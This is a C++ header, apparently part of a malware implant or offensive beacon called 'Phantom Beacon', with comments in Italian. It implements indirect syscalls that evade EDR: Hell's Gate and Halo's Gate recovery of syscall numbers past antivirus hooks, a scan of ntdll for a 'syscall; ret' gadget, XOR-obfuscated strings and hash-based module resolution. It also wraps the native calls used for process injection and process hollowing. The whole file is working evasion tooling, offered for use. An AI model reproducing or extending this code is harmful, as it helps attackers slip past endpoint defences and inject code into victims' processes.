#pragma once
// ============================================================================
//  syscalls.h — Phantom Beacon Indirect Syscalls (Fully Corrected)
//  ──────────────────────────────────────────────────────────────
//  Bypasses user-mode hooks by executing syscalls indirectly via ntdll gadgets.
//  Dynamically resolves SSNs using Hell's Gate / Halo's Gate methods.
// ============================================================================

#ifdef _WIN32
#include <windows.h>
#include <winternl.h>
#include <vector>
#include <algorithm>
#include <cstring>
#include "evasion.h"
#include "crypto.h"

// Firme esterne collegate al modulo Assembly nativo (syscalls.asm / syscalls.o)
extern "C" NTSTATUS execute_syscall(
    uint32_t ssn, 
    uintptr_t gadget, 
    PVOID a1, PVOID a2, PVOID a3, PVOID a4, 
    PVOID a5, PVOID a6, PVOID a7, PVOID a8, 
    PVOID a9, PVOID a10, PVOID a11
);        
extern "C" uint32_t get_ssn(void* addr);
extern "C" BOOL clear_hw_breakpoints();
extern "C" void flush_cpu_telemetry();

namespace syscalls {

// Halo's Gate / Hell's Gate: Estrae il SSN leggendo i byte o scansionando i vicini se c'è un hook dell'EDR
inline uint32_t find_ssn(uint8_t* pFunc) {
    if (!pFunc) return 0;

    // Sfrutta l'helper nativo in Assembly per leggere i byte corretti senza attivare l'hook
    uint32_t ssn = get_ssn(pFunc);

    // Se la funzione inizia con 0xE9 (JMP), significa che l'User-Mode dell'antivirus ha inserito un hook
    if (pFunc[0] == 0xE9) {
        // Scansiona i vicini di memoria superiori ed inferiori per ricostruire l'SSN originale
        for (int i = 1; i <= 500; i++) {
            // Controlla il vicino superiore (offset standard a 32 byte)
            uint8_t* pNeighbor = pFunc + (i * 32);
            if (pNeighbor[0] == 0x4C && pNeighbor[1] == 0x8B && pNeighbor[2] == 0xD1 && pNeighbor[3] == 0xB8) {
                return *reinterpret_cast<uint32_t*>(pNeighbor + 4) - i;
            }
            // Controlla il vicino inferiore
            pNeighbor = pFunc - (i * 32);
            if (pNeighbor[0] == 0x4C && pNeighbor[1] == 0x8B && pNeighbor[2] == 0xD1 && pNeighbor[3] == 0xB8) {
                return *reinterpret_cast<uint32_t*>(pNeighbor + 4) + i;
            }
        }
    }
    return ssn;
}

// Cerca l'istruzione 'syscall; ret' (0x0F, 0x05, 0xC3) all'interno della sezione .text della ntdll.dll originale
inline uintptr_t find_syscall_gadget() {
    HMODULE hNtdll = peb::GetModuleByHash(peb::HASH_NTDLL);
    if (!hNtdll) return 0;

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)hNtdll + dosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);

    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        // Usa l'offuscamento di stringa integrato nel framework per nascondere il nome della sezione
        if (!std::strcmp((char*)sectionHeader[i].Name, XOR_DEC(XOR_STR(".text")))) {
            uint8_t* pText = (uint8_t*)hNtdll + sectionHeader[i].VirtualAddress;
            for (DWORD j = 0; j < sectionHeader[i].Misc.VirtualSize - 2; j++) {
                if (pText[j] == 0x0F && pText[j+1] == 0x05 && pText[j+2] == 0xC3) {
                    return (uintptr_t)(pText + j); // Ritorna l'indirizzo esatto del trampolino
                }
            }
        }
    }
    return 0;
}

// Variabile statica globale per memorizzare l'indirizzo del gadget ed evitare scansioni ripetitive
static uintptr_t g_syscall_gadget = 0;

// ── INIZIO WRAPPERS INDIRETTI DELLE SYSCALL NATIVE ─────────────────────────

// Wrapper per NtProtectVirtualMemory
inline NTSTATUS SysNtProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T NumberOfBytesToProtect, ULONG NewAccessProtection, PULONG OldAccessProtection) {
    if (g_syscall_gadget == 0) g_syscall_gadget = find_syscall_gadget();
    auto pFunc = peb::Resolve(peb::HASH_NTDLL, FN_NTPROTECTVIRTUALMEMORY);
    uint32_t ssn = find_ssn((uint8_t*)pFunc);
    return ::execute_syscall(ssn, g_syscall_gadget, ProcessHandle, BaseAddress, NumberOfBytesToProtect, (PVOID)(ULONG_PTR)NewAccessProtection, OldAccessProtection, 0, 0, 0, 0, 0, 0);
}

// Wrapper per NtAllocateVirtualMemory
inline NTSTATUS SysNtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) {
    if (g_syscall_gadget == 0) g_syscall_gadget = find_syscall_gadget();
    auto pFunc = peb::Resolve(peb::HASH_NTDLL, FN_NTALLOCATEVIRTUALMEMORY);
    uint32_t ssn = find_ssn((uint8_t*)pFunc);
    return ::execute_syscall(ssn, g_syscall_gadget, ProcessHandle, BaseAddress, (PVOID)ZeroBits, RegionSize, (PVOID)(ULONG_PTR)AllocationType, (PVOID)(ULONG_PTR)Protect, 0, 0, 0, 0, 0);
}

// Wrapper per NtWriteVirtualMemory
inline NTSTATUS SysNtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten) {
    if (g_syscall_gadget == 0) g_syscall_gadget = find_syscall_gadget();
    auto pFunc = peb::Resolve(peb::HASH_NTDLL, FN_NTWRITEVIRTUALMEMORY);
    uint32_t ssn = find_ssn((uint8_t*)pFunc);
    return ::execute_syscall(ssn, g_syscall_gadget, ProcessHandle, BaseAddress, Buffer, (PVOID)NumberOfBytesToWrite, NumberOfBytesWritten, 0, 0, 0, 0, 0, 0);
}

// Wrapper per NtOpenProcess
inline NTSTATUS SysNtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, void* ClientId) {
    if (g_syscall_gadget == 0) g_syscall_gadget = find_syscall_gadget();
    auto pFunc = peb::Resolve(peb::HASH_NTDLL, FN_NTOPENPROCESS);
    uint32_t ssn = find_ssn((uint8_t*)pFunc);
    return ::execute_syscall(ssn, g_syscall_gadget, ProcessHandle, (PVOID)(ULONG_PTR)DesiredAccess, ObjectAttributes, ClientId, 0, 0, 0, 0, 0, 0, 0);
}

// Wrapper per NtCreateThreadEx (Ora interamente convertito a Indirect Syscall nativa con 11 parametri)
inline NTSTATUS SysNtCreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaxStackSize, PVOID AttributeList) {
    if (g_syscall_gadget == 0) g_syscall_gadget = find_syscall_gadget();
    auto pFunc = peb::Resolve(peb::HASH_NTDLL, FN_NTCREATETHREADEX);
    if (!pFunc) return 0xC0000001; // STATUS_UNSUCCESSFUL
    
    uint32_t ssn = find_ssn((uint8_t*)pFunc);
    return ::execute_syscall(
        ssn, 
        g_syscall_gadget, 
        ThreadHandle, 
        (PVOID)(ULONG_PTR)DesiredAccess, 
        ObjectAttributes, 
        ProcessHandle, 
        StartRoutine, 
        Argument, 
        (PVOID)(ULONG_PTR)CreateFlags, 
        (PVOID)ZeroBits, 
        (PVOID)StackSize, 
        (PVOID)MaxStackSize, 
        AttributeList
    );
}

// Wrapper per NtUnmapViewOfSection (Process Hollowing)
inline NTSTATUS SysNtUnmapViewOfSection(HANDLE ProcessHandle, PVOID BaseAddress) {
    if (g_syscall_gadget == 0) g_syscall_gadget = find_syscall_gadget();
    auto pFunc = peb::Resolve(peb::HASH_NTDLL, FN_NTUNMAPVIEWOFSECTION);
    if (!pFunc) return 0xC0000001;
    uint32_t ssn = find_ssn((uint8_t*)pFunc);
    return ::execute_syscall(ssn, g_syscall_gadget, ProcessHandle, BaseAddress, 0, 0, 0, 0, 0, 0, 0, 0, 0);
}

// Wrapper per NtGetContextThread
inline NTSTATUS SysNtGetContextThread(HANDLE ThreadHandle, PCONTEXT Context) {
    if (g_syscall_gadget == 0) g_syscall_gadget = find_syscall_gadget();
    auto pFunc = peb::Resolve(peb::HASH_NTDLL, FN_NTGETCONTEXTTHREAD);
    if (!pFunc) return 0xC0000001;
    uint32_t ssn = find_ssn((uint8_t*)pFunc);
    return ::execute_syscall(ssn, g_syscall_gadget, ThreadHandle, Context, 0, 0, 0, 0, 0, 0, 0, 0, 0);
}

// Wrapper per NtSetContextThread
inline NTSTATUS SysNtSetContextThread(HANDLE ThreadHandle, PCONTEXT Context) {
    if (g_syscall_gadget == 0) g_syscall_gadget = find_syscall_gadget();
    auto pFunc = peb::Resolve(peb::HASH_NTDLL, FN_NTSETCONTEXTTHREAD);
    if (!pFunc) return 0xC0000001;
    uint32_t ssn = find_ssn((uint8_t*)pFunc);
    return ::execute_syscall(ssn, g_syscall_gadget, ThreadHandle, Context, 0, 0, 0, 0, 0, 0, 0, 0, 0);
}

// Wrapper per NtResumeThread
inline NTSTATUS SysNtResumeThread(HANDLE ThreadHandle, PULONG SuspendCount) {
    if (g_syscall_gadget == 0) g_syscall_gadget = find_syscall_gadget();
    auto pFunc = peb::Resolve(peb::HASH_NTDLL, FN_NTRESUMETHREAD);
    if (!pFunc) return 0xC0000001;
    uint32_t ssn = find_ssn((uint8_t*)pFunc);
    return ::execute_syscall(ssn, g_syscall_gadget, ThreadHandle, SuspendCount, 0, 0, 0, 0, 0, 0, 0, 0, 0);
}

// Wrapper per NtClose
inline NTSTATUS SysNtClose(HANDLE Handle) {
    if (g_syscall_gadget == 0) g_syscall_gadget = find_syscall_gadget();
    auto pFunc = peb::Resolve(peb::HASH_NTDLL, FN_NTCLOSE);
    if (!pFunc) return 0xC0000001;
    uint32_t ssn = find_ssn((uint8_t*)pFunc);
    return ::execute_syscall(ssn, g_syscall_gadget, Handle, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
}

// Wrapper per NtReadVirtualMemory
inline NTSTATUS SysNtReadVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToRead, PSIZE_T NumberOfBytesRead) {
    if (g_syscall_gadget == 0) g_syscall_gadget = find_syscall_gadget();
    auto pFunc = peb::Resolve(peb::HASH_NTDLL, FN_NTREADVIRTUALMEMORY);
    if (!pFunc) return 0xC0000001;
    uint32_t ssn = find_ssn((uint8_t*)pFunc);
    return ::execute_syscall(ssn, g_syscall_gadget, ProcessHandle, BaseAddress, Buffer, (PVOID)NumberOfBytesToRead, NumberOfBytesRead, 0, 0, 0, 0, 0, 0);
}

// Wrapper per NtQueryInformationProcess
inline NTSTATUS SysNtQueryInformationProcess(HANDLE ProcessHandle, PROCESSINFOCLASS InfoClass, PVOID InfoBuffer, ULONG InfoBufferSize, PULONG ReturnLength) {
    if (g_syscall_gadget == 0) g_syscall_gadget = find_syscall_gadget();
    auto pFunc = peb::Resolve(peb::HASH_NTDLL, FN_NTQUERYINFORMATIONPROCESS);
    if (!pFunc) return 0xC0000001;
    uint32_t ssn = find_ssn((uint8_t*)pFunc);
    return ::execute_syscall(ssn, g_syscall_gadget, ProcessHandle, (PVOID)(ULONG_PTR)InfoClass, InfoBuffer, (PVOID)(ULONG_PTR)InfoBufferSize, ReturnLength, 0, 0, 0, 0, 0, 0);
}

} // namespace syscalls
#endif
